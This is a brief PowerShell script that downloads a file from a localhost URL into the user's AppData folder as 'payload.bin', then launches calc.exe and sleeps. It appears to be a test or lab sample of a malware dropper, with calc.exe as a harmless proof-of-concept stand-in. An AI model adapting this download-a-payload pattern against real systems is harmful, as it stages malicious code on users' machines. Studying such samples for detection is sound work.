[CmdletBinding()]
param(
    [string]$RemoteUrl = "http://127.0.0.1/update.dat",
    [string]$LocalPath = "$env:APPDATA\payload.bin"
)
(New-Object System.Net.WebClient).DownloadFile($RemoteUrl, $LocalPath)
Start-Process -FilePath "calc.exe"
Start-Sleep -Seconds 23
